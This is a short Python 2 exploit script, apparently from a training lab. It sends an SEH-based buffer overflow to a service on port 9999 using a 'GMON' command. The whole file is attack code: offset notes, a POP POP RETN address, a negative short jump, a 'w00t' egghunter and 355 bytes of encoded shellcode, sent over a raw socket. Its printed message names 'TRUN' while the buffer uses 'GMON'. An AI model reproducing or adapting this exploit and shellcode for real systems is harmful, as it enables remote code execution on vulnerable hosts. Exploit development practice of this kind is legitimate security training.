#!/usr/bin/python

import socket
import os
import sys

#[*] Exact match at offset 3499

#625010b4    POP POP RETN
#EB D0       Negative Short Jump

#Egghunter - 32 bytes
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

#Where \x77\x30\x30\x74 = w00t (egg)

#shellcode - 355 bytes
buf =  ""
buf += "\xdd\xc6\xbe\x3d\x26\x0a\x27\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x53\x31\x77\x17\x03\x77\x17\x83\xd2\xda\xe8"
buf += "\xd2\xd0\xcb\x6f\x1c\x28\x0c\x10\x94\xcd\x3d\x10\xc2"
buf += "\x86\x6e\xa0\x80\xca\x82\x4b\xc4\xfe\x11\x39\xc1\xf1"
buf += "\x92\xf4\x37\x3c\x22\xa4\x04\x5f\xa0\xb7\x58\xbf\x99"
buf += "\x77\xad\xbe\xde\x6a\x5c\x92\xb7\xe1\xf3\x02\xb3\xbc"
buf += "\xcf\xa9\x8f\x51\x48\x4e\x47\x53\x79\xc1\xd3\x0a\x59"
buf += "\xe0\x30\x27\xd0\xfa\x55\x02\xaa\x71\xad\xf8\x2d\x53"
buf += "\xff\x01\x81\x9a\xcf\xf3\xdb\xdb\xe8\xeb\xa9\x15\x0b"
buf += "\x91\xa9\xe2\x71\x4d\x3f\xf0\xd2\x06\xe7\xdc\xe3\xcb"
buf += "\x7e\x97\xe8\xa0\xf5\xff\xec\x37\xd9\x74\x08\xb3\xdc"
buf += "\x5a\x98\x87\xfa\x7e\xc0\x5c\x62\x27\xac\x33\x9b\x37"
buf += "\x0f\xeb\x39\x3c\xa2\xf8\x33\x1f\xab\xcd\x79\x9f\x2b"
buf += "\x5a\x09\xec\x19\xc5\xa1\x7a\x12\x8e\x6f\x7d\x55\xa5"
buf += "\xc8\x11\xa8\x46\x29\x38\x6f\x12\x79\x52\x46\x1b\x12"
buf += "\xa2\x67\xce\x8f\xaa\xce\xa1\xad\x57\xb0\x11\x72\xf7"
buf += "\x59\x78\x7d\x28\x79\x83\x57\x41\x12\x7e\x58\x7c\xbf"
buf += "\xf7\xbe\x14\x2f\x5e\x68\x80\x8d\x85\xa1\x37\xed\xef"
buf += "\x99\xdf\xa6\xf9\x1e\xe0\x36\x2c\x09\x76\xbd\x23\x8d"
buf += "\x67\xc2\x69\xa5\xf0\x55\xe7\x24\xb3\xc4\xf8\x6c\x23"
buf += "\x64\x6a\xeb\xb3\xe3\x97\xa4\xe4\xa4\x66\xbd\x60\x59"
buf += "\xd0\x17\x96\xa0\x84\x50\x12\x7f\x75\x5e\x9b\xf2\xc1"
buf += "\x44\x8b\xca\xca\xc0\xff\x82\x9c\x9e\xa9\x64\x77\x51"
buf += "\x03\x3f\x24\x3b\xc3\xc6\x06\xfc\x95\xc6\x42\x8a\x79"
buf += "\x76\x3b\xcb\x86\xb7\xab\xdb\xff\xa5\x4b\x23\x2a\x6e"
buf += "\x6b\xc6\xfe\x9b\x04\x5f\x6b\x26\x49\x60\x46\x65\x74"
buf += "\xe3\x62\x16\x83\xfb\x07\x13\xcf\xbb\xf4\x69\x40\x2e"
buf += "\xfa\xde\x61\x7b"

buffer="GMON /.:/" + "w00tw00t" + buf +  "A"*(3447 - len(buf)) + "\x90"*8 + egghunter + "\x90\x90\xEB\xD0" + "\xB3\x11\x50\x62" + "C"*(5009 - 3503)

print "[*] Sending evil TRUN request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.119", 9999))
expl.send(buffer)
expl.close()

